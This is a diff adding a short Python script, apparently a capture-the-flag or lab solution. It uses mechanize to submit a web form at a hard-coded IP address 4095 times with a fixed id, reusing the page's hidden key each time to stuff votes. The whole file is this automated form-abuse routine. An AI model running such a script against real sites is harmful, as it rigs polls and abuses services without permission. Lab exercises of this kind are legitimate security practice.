@@ -1,0 +1,16 @@
+#!/usr/bin/python3
+import mechanize
+browser = mechanize.Browser()
+url = 'http://158.69.76.135/level1.php'
+response = browser.open(url)
+for i in range(4095):
+    browser.select_form(nr=0)
+    input = browser.form.find_control("id")
+    input.value="1209"
+    key = browser.form.find_control("key")
+    print(key.value)
+    res = browser.submit().read().decode('ascii')
+    if res == "See you later hacker! [5]":
+        print(res)
+    print(i)
+    browser.open(url)
